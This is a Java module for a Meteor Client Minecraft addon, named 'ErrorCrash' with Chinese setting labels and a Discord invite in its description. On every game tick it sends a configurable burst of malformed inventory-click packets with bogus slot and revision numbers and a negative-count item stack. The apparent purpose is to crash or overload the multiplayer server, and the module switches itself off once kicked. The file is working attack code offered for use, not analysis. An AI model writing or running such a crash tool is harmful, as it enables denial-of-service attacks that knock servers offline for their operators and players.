package widecat.meteorcrashaddon.modules;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import widecat.meteorcrashaddon.CrashAddon;

public class ErrorCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("发包数量")
        .description("发包的数量")
        .defaultValue(15)
        .min(1)
        .sliderMax(100)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("踢出关闭")
        .description("在被踢出时禁用模块")
        .defaultValue(true)
        .build());

    public ErrorCrash() {
        super(CrashAddon.CATEGORY, "错误崩溃", "我喜欢discord.gg/g42rvX3c6s!!!!!");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        Int2ObjectMap<ItemStack> REAL = new Int2ObjectArrayMap<>();
        REAL.put(0, new ItemStack(Items.RED_DYE, 1));
        for (int i = 0; i < amount.get(); i++) {
            mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId,123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), REAL));
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
